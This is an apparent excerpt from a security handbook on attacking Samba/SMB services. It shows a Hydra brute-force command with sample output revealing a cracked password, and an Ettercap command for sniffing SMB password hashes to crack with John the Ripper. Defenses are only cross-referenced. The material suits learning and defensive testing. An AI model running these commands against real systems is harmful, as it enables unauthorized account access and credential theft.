  md: "# ### Samba: 137 to 139 (TCP)\n\nSamba uses the SMB (Server Message Block)\
    \ protocol to share files and printers over the network. SMB is most commonly\
    \ used by Microsoft Windows operating systems. See http://www.samba.org/ for details\
    \ on the Samba project.\n\n**Brute-Forcing** Since Samba authenticates using a\
    \ username and password pair, it is possible to brute-force user accounts.\n\n\
    # #### Brute-Force Samba\n\nHydra can be used to brute-force SMB authentication:\n\
    \n```\n```bash\n$ hydra -L usernames.txtx -P passwords.txt 10.0.0.1 smb\nReduced\
    \ number of tasks to 1 (smb does not like parallel connections)\nHydra v2.2 (c)\
    \ 2002 by van Hauser / THC - use allowed only for legal\npurposes.\n  Hydra is\
    \ starting! [parallel tasks: 1, login tries: 2 (1:2/p:1)]\n[139][smb] login: Joe\
    \ password: Sh4k3$1s0und!\nHydra finished.\n```\n```\n\n# #### Prevent Samba Brute-Forcing\n\
    \n> > Please see “Common Defenses Against Brute-Force Attacks.”\n\n**Sniffing**\
    \ It is possible to sniff password hashes transmitted over the network during\
    \ Samba authentication. Once the hashes are captured, they must be brute-force\
    \ cracked in order to obtain the real password.\n\n# #### Obtain Samba Password\
    \ Hashes\n\nEttercap can be used to capture Samba hashes sent over the network\
    \ during authentication. For example, here is how you would run Ettercap to collect\
    \ SMB password hashes being transmitted over the network:\n\n```\n```\nettercap\
    \ -C -N -m\n```\n```\n\nPassword crackers such as John the Ripper, available at\
    \ http://www.openwall.com/john/, can be used to crack the obtained hashes.\n\n\
    # #### Tunnel Samba Traffic Securely\n\n> > Please see “Block and Tunnel Samba\
    \ Traffic.”"
